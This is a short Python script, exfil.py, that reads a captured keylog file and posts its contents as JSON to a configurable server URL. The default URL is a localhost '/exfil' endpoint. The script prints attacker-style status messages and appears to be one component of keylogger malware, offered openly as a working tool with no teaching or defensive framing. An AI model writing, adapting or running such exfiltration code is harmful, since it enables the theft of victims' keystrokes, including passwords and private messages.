# exfil.py — send keylog file to remote server
import requests
import os

DEFAULT_URL = "http://localhost:8000/exfil"
DEFAULT_FILE = "keylog.txt"

def send_keylog(url=DEFAULT_URL, filepath=DEFAULT_FILE):
    if not os.path.exists(filepath):
        print("[!] No keylog to exfil.")
        return

    with open(filepath, "r") as f:
        content = f.read()

    data = {
        "filename": filepath,
        "content": content
    }

    try:
        r = requests.post(url, json=data)
        print(f"[+] Keylog exfiltrated. Status: {r.status_code}")
    except Exception as e:
        print(f"[!] Exfiltration failed: {e}")
